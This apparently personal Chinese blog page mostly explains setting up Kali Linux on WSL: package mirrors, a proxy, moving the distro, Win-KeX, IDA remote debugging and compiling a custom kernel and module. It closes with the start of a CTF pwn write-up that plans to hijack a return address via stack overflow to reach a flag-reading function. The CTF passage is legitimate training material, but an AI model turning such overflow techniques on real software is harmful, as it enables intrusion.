<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>

<p>将该文件修改为阿里云的源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>修改之后可以<code>apt update</code>看看成功没</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# apt update</span><br><span class="line">Get:1 https://mirrors.aliyun.com/kali kali-rolling InRelease [30.6 kB]</span><br><span class="line">Get:2 https://mirrors.aliyun.com/kali kali-rolling/main Sources [14.7 MB]</span><br><span class="line">Get:3 https://mirrors.aliyun.com/kali kali-rolling/non-free Sources [128 kB]</span><br><span class="line">Get:4 https://mirrors.aliyun.com/kali kali-rolling/contrib Sources [73.1 kB]</span><br><span class="line">Get:5 https://mirrors.aliyun.com/kali kali-rolling/main amd64 Packages [18.4 MB]</span><br><span class="line">Get:6 https://mirrors.aliyun.com/kali kali-rolling/non-free amd64 Packages [213 kB]</span><br><span class="line">Get:7 https://mirrors.aliyun.com/kali kali-rolling/contrib amd64 Packages [116 kB]</span><br><span class="line">Fetched 33.6 MB <span class="keyword">in</span> 22s (1,505 kB/s)</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">257 packages can be upgraded. Run <span class="string">&#x27;apt list --upgradable&#x27;</span> to see them.</span><br></pre></td></tr></table></figure>





<h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><p>找个好地方<code>vim bash_profile</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=http://172.25.144.1:7891/</span><br><span class="line">export https_proxy=http://172.25.144.1:7891/</span><br></pre></td></tr></table></figure>

<p>这里172.25.144.1是我windows本机的wsl网卡地址,这玩意儿可以在<code>/etc/resolv.conf</code>查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home]</span><br><span class="line">└─# cat /etc/resolv.conf</span><br><span class="line"># This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:</span><br><span class="line"># [network]</span><br><span class="line"># generateResolvConf = false</span><br><span class="line">nameserver 172.25.144.1</span><br></pre></td></tr></table></figure>

<p>端口号为啥是7891呢,因为我本机clash在7891上开的代理端口</p>
<p>注意clash开允许局域网,系统代理</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20240321233234943.png" alt="image-20240321233234943"></p>
<p>写完了bash_profile之后保存退出,然后<code>source bash_profile</code></p>
<p><strong>这样对于本终端就已经更换了代理,重新开机或者打开其他终端都没有此设置</strong></p>
<h2 id="wsl迁移"><a href="#wsl迁移" class="headerlink" title="wsl迁移"></a>wsl迁移</h2><p>kali-linux迁移前的C卷大小</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716102545759.png" alt="image-20220716102545759"></p>
<p>由于我想为kali安装一个xfce桌面,KDE桌面很大,又要剥削压迫C卷,于是就像把wsl搬到D卷</p>
<p>先用安装了python3的ubuntu20.04LTS做了一个实验,结果迁移后的ubuntu还是有python3的,这意味着以前的修改都会保留</p>
<p>kali-linux迁移过程:</p>
<h3 id="1-wsl关机"><a href="#1-wsl关机" class="headerlink" title="1.wsl关机"></a>1.wsl关机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure>

<h3 id="2-选好目的地"><a href="#2-选好目的地" class="headerlink" title="2.选好目的地"></a>2.选好目的地</h3><p>我将D:\wsl\kali作为目的地,加一个wsl父目录是因为,同父目录下还有D:\wsl\ubuntu子系统,将powershell的当前工作目录调整到D:\wsl\kali</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\wsl\kali&gt; <span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">Path</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">D:\wsl\kali</span><br></pre></td></tr></table></figure>

<h3 id="3-选择需要导出的子系统"><a href="#3-选择需要导出的子系统" class="headerlink" title="3.选择需要导出的子系统"></a>3.选择需要导出的子系统</h3><p>使用<code>wsl -l</code>指令列出所有已经注册的子系统名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\wsl\kali&gt; wsl <span class="literal">-l</span></span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">kali<span class="literal">-linux</span> (默认)</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure>

<h3 id="4-导出kali-linux-tar"><a href="#4-导出kali-linux-tar" class="headerlink" title="4.导出kali-linux.tar"></a>4.导出<code>kali-linux.tar</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --export &lt;子系统名&gt; &lt;tar包路径&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\wsl\kali&gt; wsl --export kali-linux ./kali.tar</span><br></pre></td></tr></table></figure>

<p>本条命令的意义是,将名为kali-linux的子系统,导出到当前工作目录下的kali.tar中</p>
<h3 id="5-卸载本来安装在C卷的kali-linux"><a href="#5-卸载本来安装在C卷的kali-linux" class="headerlink" title="5.卸载本来安装在C卷的kali-linux"></a>5.卸载本来安装在C卷的kali-linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --unregister &lt;子系统名&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\wsl\kali&gt; wsl --unregister kali-linux</span><br><span class="line">正在注销...</span><br></pre></td></tr></table></figure>

<h3 id="6-导入迁移到D卷的kali-linux"><a href="#6-导入迁移到D卷的kali-linux" class="headerlink" title="6.导入迁移到D卷的kali-linux"></a>6.导入迁移到D卷的kali-linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --import &lt;子系统名&gt; &lt;子系统安装路径&gt; &lt;tar包路径&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\wsl\kali&gt; wsl <span class="literal">--import</span> kali<span class="literal">-linux</span> . ./kali.tar</span><br></pre></td></tr></table></figure>

<p>本条命令的意义是,从当前目录的kali.tar包导入子系统到当前目录,子系统名叫kali-linux</p>
<h3 id="7-验证导出成功"><a href="#7-验证导出成功" class="headerlink" title="7.验证导出成功"></a>7.验证导出成功</h3><p>终端启动kali成功</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716103913136.png" alt="image-20220716103913136"></p>
<p>虽然迁移kali只给C省出了3G的磁盘空间…</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716103955718.png" alt="image-20220716103955718"></p>
<p>但是可以放心安装桌面了</p>
<h2 id="安装桌面"><a href="#安装桌面" class="headerlink" title="安装桌面"></a>安装桌面</h2><p>在此之前需要保证wsl升级到wsl2,换下载源到阿里云(如果梯子流量管够忽略)</p>
<h3 id="安装Win-KeX"><a href="#安装Win-KeX" class="headerlink" title="安装Win-KeX"></a>安装Win-KeX</h3><blockquote>
<p>Win-KeX是windows为kali专门提供的桌面体验,具有以下功能</p>
<ul>
<li>窗口模式：在专用窗口中启动Kali Linux桌面</li>
<li>无缝模式：在Windows和Kali应用程序和菜单之间共享Windows桌面</li>
<li>声音支持</li>
<li>无特权和根会话支持</li>
<li>共享剪贴板，可在Kali Linux和Windows应用之间进行剪切和粘贴支持</li>
<li>多会话支持：根窗口和非私有窗口以及无缝会话同时进行</li>
</ul>
</blockquote>
<p>安装之前先<code>apt update</code>更新一下</p>
<p>之后安装Win-KeX</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y kali-win-kex</span><br></pre></td></tr></table></figure>

<p>安装可能很慢…但是速度是百度云盘两倍(比烂是吧)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716104931612.png" alt="image-20220716104931612"></p>
<p>安装完成后在kali上使用kex命令,输入一些密码之后,就可以使用xfce桌面了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716114030667.png" alt="image-20220716114030667"></p>
<p>在kex中使用F8键可以选择桌面以windows窗口运行还是全屏运行,</p>
<p>全屏时就和真的kali系统没有区别了,所有键鼠命令都会被kali捕获,不会发往windows</p>
<p>F8的fullscreen可以设置窗口或者全屏模式</p>
<h2 id="完整everything"><a href="#完整everything" class="headerlink" title="完整everything"></a>完整everything</h2><p>一开始安装的子系统只是最小安装,只安装了一个系统,各种武器都没有安装</p>
<p>kali子系统完整安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install kali-linux-everything</span><br></pre></td></tr></table></figure>

<p>大约有20个G,还是在学校wifi环境下安装吧,使用流量划不来</p>
<h2 id="ida-wsl远程调试"><a href="#ida-wsl远程调试" class="headerlink" title="ida+wsl远程调试"></a>ida+wsl远程调试</h2><p>终于会动态调试了</p>
<p>但是windows上的IDA似乎只能用local windows debugger,其他的各种各样的设置看了就烦</p>
<p>今天终于不厌其烦试了试IDA+remote linux debugger在ida上调试elf文件</p>
<p>终于调通了</p>
<p>需要ida,wsl</p>
<h3 id="remote-linux-debugger"><a href="#remote-linux-debugger" class="headerlink" title="remote linux debugger"></a>remote linux debugger</h3><p>win11+wsl kali+ida</p>
<p><code>IDA-&lt;version&gt;/dbgsrv/</code>这个目录下面有调试需要使用的文件</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220901163211166.png" alt="image-20220901163211166"></p>
<p>如果要使用linux远程调试elf文件,需要linux_server和linux_server64两个文件,把他俩复制到kali的文件系统中去</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# ls -l | grep linux</span><br><span class="line">-rwxrwxrwx 1 root root 783792 Jan  1  2021 linux_server</span><br><span class="line">-rwxrwxrwx 1 root root 735376 Jan  1  2021 linux_server64</span><br></pre></td></tr></table></figure>

<p>cd 到该目录下,修改其权限</p>
<p>可以使用–help看linux_server的用法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 linux_server</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# ./linux_server --help</span><br><span class="line">IDA Linux 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020</span><br><span class="line">Usage: linux_server [options]</span><br><span class="line">  -p ...  (--port-number ...) Port number</span><br><span class="line">  -i ...  (--ip-address ...) IP address to bind to (default to any)</span><br><span class="line">  -s      (--use-tls) Use TLS</span><br><span class="line">  -c ...  (--certchain-file ...) TLS certificate chain file</span><br><span class="line">  -k ...  (--privkey-file ...) TLS private key file</span><br><span class="line">  -v      (--verbose) Verbose mode</span><br><span class="line">  -P ...  (--password ...) Password</span><br><span class="line">  -k      (--on-broken-connection-keep-session) Keep debugger session alive when connection breaks</span><br><span class="line">  -K      (--on-stop-kill-process) Kill debuggee when closing session</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行linux_server</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# ./linux_server</span><br><span class="line">IDA Linux 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br></pre></td></tr></table></figure>

<p>此时kali已经在监听其23946端口了</p>
<p>现在用ida打开一个32位elf程序,F9或者点击Debugger下拉菜单,选择调试器Remote Linux debugger</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220901163954709.png" alt="image-20220901163954709"></p>
<p>然后调试运行(ida默认也是访问远程主机的23946端口,如果不是则这里肯定联不通,ida会让重新设置端口的)</p>
<p>必然会报错找不到输入文件,</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220901164111650.png" alt="image-20220901164111650"></p>
<p>一看报错信息,原来输入文件是从远程linux上找的,当然找不到</p>
<p>OK之后ida提供了替代方案</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220901164214375.png" alt="image-20220901164214375"></p>
<p>点这个Use found就可以使用本机的<code>C:\Users\86135\Desktop\malloc\main</code>作为输入文件了</p>
<p>但是调试界面刚出来又没了,原来是忘记下断点了</p>
<p>在main函数(或者其他地方)下断点,然后重新调试运行,可以调试了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220901164532437.png" alt="image-20220901164532437"></p>
<p>甚至可以使用F5反汇编,显然是linux上的光棍儿gdb做不到的</p>
<h3 id="remote-gbd-debugger"><a href="#remote-gbd-debugger" class="headerlink" title="remote gbd debugger"></a>remote gbd debugger</h3><p>既然linux上也有gdb,那么是不是也可以用远程gdb调试呢?确实能调通,安一个gdbserver剩下的随便拾到拾到就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install gdbserver</span><br></pre></td></tr></table></figure>



<p>&#x2F;usr&#x2F;src&#x2F;WSL2-Linux-Kernel-linux-msft-wsl-5.15.137.3&#x2F;arch&#x2F;x86&#x2F;boot&#x2F;bzImage</p>
<h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>如果用普通的linux内核直接编译,然后给wsl换这个普通内核,这样wsl起不来</p>
<p>编译wsl内核需要有专门的config文件</p>
<p>内核源码可以用原版的,比如到这里下载<a target="_blank" rel="noopener" href="https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/">Index of &#x2F;pub&#x2F;linux&#x2F;kernel&#x2F;v5.x&#x2F;</a></p>
<p>以5.8.13为例,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.8.13.tar.gz</span><br><span class="line">tar -xzf linux-5.8.13.tar.gz</span><br><span class="line">cd linux-5.8.13</span><br></pre></td></tr></table></figure>

<p>然后在内核源码的根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir Microsoft</span><br><span class="line">cd Microsoft</span><br><span class="line">vim config-wsl</span><br></pre></td></tr></table></figure>

<p>这玩意儿可以抄<a target="_blank" rel="noopener" href="https://github.com/xieyubo/WSL2-Linux-Kernel/blob/wsl-xyb-port-5.8.y-latest/Microsoft/config-wsl">WSL2-Linux-Kernel&#x2F;Microsoft&#x2F;config-wsl at wsl-xyb-port-5.8.y-latest · xieyubo&#x2F;WSL2-Linux-Kernel · GitHub</a>,注意版本,5.8的内核就得抄5.8的config_wsl,直接复制粘贴</p>
<p>可以修改其中的<code>CONFIG_LOCALVERSION</code>,改成自定义内核名称后缀</p>
<p>完事之后退到内核源码根目录下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make KCONIFG_CONFIG=./Microsoft/config-wsl -j`<span class="built_in">nproc</span>`</span><br></pre></td></tr></table></figure>

<p>编译完了之后会生成.&#x2F;arch&#x2F;x86&#x2F;boot&#x2F;bzImage,这就是可以引导的内核</p>
<p>可以安装头文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make modules_install</span><br></pre></td></tr></table></figure>











<h2 id="更换内核"><a href="#更换内核" class="headerlink" title="更换内核"></a>更换内核</h2><h3 id="默认配置"><a href="#默认配置" class="headerlink" title="默认配置"></a>默认配置</h3><p>如果没有在~&#x2F;.wslconfig中修改内核位置,那么可以这样整:</p>
<p>编译内核完成后,将生成的bzImage可引导镜像放到本机的<code>C:\Windows\System32\lxss\tools</code>这个位置</p>
<p><code>wsl --shutdown</code></p>
<p>在<code>C:\Windows\System32\lxss\tools</code>中,将之前的内核镜像kernel改个名,比如oldkernel</p>
<p>然后将刚搬过来的bzImage改成kernel</p>
<p>重启wsl</p>
<p><code>uname -a</code>查看当前内核版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/dustball/kernelROP/mydev]</span><br><span class="line">└─# uname -a</span><br><span class="line">Linux Executor 5.8.13-dustland #1 SMP Sun Mar 24 13:56:15 CST 2024 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>



<h3 id="指定kernel位置"><a href="#指定kernel位置" class="headerlink" title="指定kernel位置"></a>指定kernel位置</h3><p>比如在windows的<code>~/.wslconfig</code>中这样写</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Settings apply across all Linux distros running on WSL 2</span></span><br><span class="line">[wsl2]</span><br><span class="line">kernel=C:\\opt\\kernel</span><br><span class="line"><span class="comment"># Limits VM memory to use no more than 4 GB, this can be set as whole numbers using GB or MB</span></span><br><span class="line">memory=4GB      <span class="comment">#限制内存最大4G</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sets the VM to use two virtual processors</span></span><br><span class="line">processors=8            <span class="comment">#设置8个处理器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vmSwitch=vEthernet</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># networkingMode=bridged</span></span><br><span class="line"><span class="comment"># vmSwitch=WSL</span></span><br><span class="line"><span class="comment"># ipv6=true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这就指定了wsl内核使用<code>c:\\opt\\kernel</code></p>
<h2 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h2><p>需要更滑内核</p>
<p>编译内核模块需要内核头文件,</p>
<p>如果已经编译过wsl内核,并且<code>make modules_install &amp;&amp; make install</code>,那么就可以直接编译内核模块了</p>
<p>如果没有编译过内核,需要先编译内核</p>
<p>假设内核模块hello.c这样写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hello.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mod_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mod_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Goodbye\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mod_init);</span><br><span class="line">module_exit(mod_exit);</span><br></pre></td></tr></table></figure>

<p>它的Makefile这样写</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Makefile</span></span><br><span class="line">KDIR = /lib/modules/5.15.137.3/</span><br><span class="line">TARGETNAME = hello</span><br><span class="line">OBJ        = <span class="variable">$(TARGETNAME)</span>.o</span><br><span class="line">MODULE     = <span class="variable">$(TARGETNAME)</span>.ko</span><br><span class="line">obj-m += <span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">		make -j <span class="variable">$(nproc)</span> -C <span class="variable">$(KDIR)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">install:</span></span><br><span class="line">		@modprobe -r <span class="variable">$(TARGETNAME)</span></span><br><span class="line">		@install <span class="variable">$(MODULE)</span> <span class="variable">$(KDIR)</span>3/kernel/drivers/hid</span><br><span class="line">		@depmod</span><br><span class="line">		@modprobe <span class="variable">$(TARGETNAME)</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">		make -C <span class="variable">$(KDIR)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>

<p>KDIR这个自己写,通常是<code>/lib/modules/$(shell uname -r)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>

<p>之后在当前目录下生成hello.ko</p>
<p>加载到内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod hello.ko</span><br></pre></td></tr></table></figure>










      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/20/xctf-pwn-%E9%AB%98%E6%89%8B%E6%9D%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/20/xctf-pwn-%E9%AB%98%E6%89%8B%E6%9D%91/" class="post-title-link" itemprop="url">xctf攻防世界-pwn-高手村</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-20 00:27:00 / Modified: 00:27:57" itemprop="dateCreated datePublished" datetime="2022-06-20T00:27:00+08:00">2022-06-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="xctf-攻防世界-pwn高手村"><a href="#xctf-攻防世界-pwn高手村" class="headerlink" title="xctf-攻防世界-pwn高手村"></a>xctf-攻防世界-pwn高手村</h1><h2 id="forgot-On2022-6-19"><a href="#forgot-On2022-6-19" class="headerlink" title="forgot (On2022.6.19)"></a>forgot (On2022.6.19)</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220619234811216.png" alt="image-20220619234811216"></p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/forgot]</span><br><span class="line">└─$ checksec forgot</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/86135/Desktop/pwn/forgot/forgot&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>没有金丝雀,没有地址随机化.</p>
<p>只有堆栈不可执行保护</p>
<h3 id="Strings视图"><a href="#Strings视图" class="headerlink" title="Strings视图"></a>Strings视图</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220619191536296.png" alt="image-20220619191536296"></p>
<p>有<code>cat</code>,<code>flag</code>字样,前往其所在的函数看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_80486CC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">58</span>]; <span class="comment">// [esp+1Eh] [ebp-3Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(s, <span class="number">0x32</span>u, <span class="string">&quot;cat %s&quot;</span>, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然只需要调用该函数就可以获取flag,该函数的起始地址是<code>0x80486CC</code>,然而该函数的Function calls视图中没有调用者,即对该函数的调用要通过站缓冲区溢出修改函数返回地址实现</p>
